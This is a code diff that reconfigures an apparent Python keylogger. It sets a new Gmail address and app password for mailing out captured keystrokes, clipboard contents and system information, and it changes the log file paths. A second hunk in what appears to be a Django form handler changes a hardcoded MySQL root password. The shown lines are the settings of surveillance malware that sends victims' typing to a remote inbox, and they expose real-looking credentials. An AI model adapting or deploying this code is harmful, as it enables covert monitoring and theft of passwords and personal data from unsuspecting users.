@@ -35,19 +35,19 @@ from requests import get
 keys_information = "key_log.txt"
 
 # email address where keystroke received
-email_address = "xyz71527@gmail.com"  # Enter disposable email here
+email_address = "khansunaina771@gmail.com"  # Enter disposable email here
 
 # password of email address
-password = "wclnolwlxmnjjuig"
+password = "emvjxjanphaqcrlk"
 
 # screenshot_information = "screenshot.png"
 clipboard_information = "clipboard.txt"
 
-file_path = "C:\\Users\\hp\\keystrokes"
+file_path = "C:\\Users\\LENOVO-PC\\Documents"
 extend = "\\"
 file_merge = file_path + extend
-system_information = "syseminfo.txt"
-toaddr = "xyz71527@gmail.com"
+system_information = "sysetminfo.txt"
+toaddr = "khansunaina771@gmail.com"
 key = " "
 count = 0
 keys = []
@@ -178,7 +178,7 @@ def ec():
 def up(request):
     global fn, ln, mb, em, pa, ca, uni, cgpa, reslink, adno, adlink, lp, gp, lt, web,r
     if request.method == 'POST':
-        m = sql.connect(host="localhost", user="root", passwd="projecttesting", database="website")
+        m = sql.connect(host="localhost", user="root", passwd="random4569", database="website")
 
         cursor = m.cursor()
         d = request.POST
